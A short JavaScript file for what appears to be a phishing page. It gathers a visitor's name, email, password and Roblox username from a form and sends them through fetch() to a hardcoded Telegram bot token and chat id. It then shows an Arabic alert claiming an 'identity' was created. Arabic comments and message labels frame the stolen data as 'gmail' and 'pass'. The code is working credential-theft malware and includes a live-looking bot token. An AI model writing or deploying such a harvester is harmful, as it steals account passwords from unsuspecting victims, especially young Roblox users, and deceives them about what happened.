function show(id) {
    document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
    document.getElementById(id).classList.remove('hidden');
}

async function send() {
    const data = {
        name: document.getElementById('name').value,
        email: document.getElementById('email').value,
        pass: document.getElementById('pass').value,
        roblox: document.getElementById('roblox').value
    };

    // ضع التوكن الجديد هنا بعد تغيير القديم
    const token = "8733348298:AAFIr8AFJ1Szk-c5rJVr22aFBs_KUJCnidI"; 
    const chat_id = "8601889519"; 
    const msg = `هوية جديدة:%0Aالاسم: ${data.name}%0Aالجيميل: ${data.email}%0Aالباس: ${data.pass}%0Aروبلوكس: ${data.roblox}`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`);
    alert("تم إنشاء الهوية بنجاح.");
}
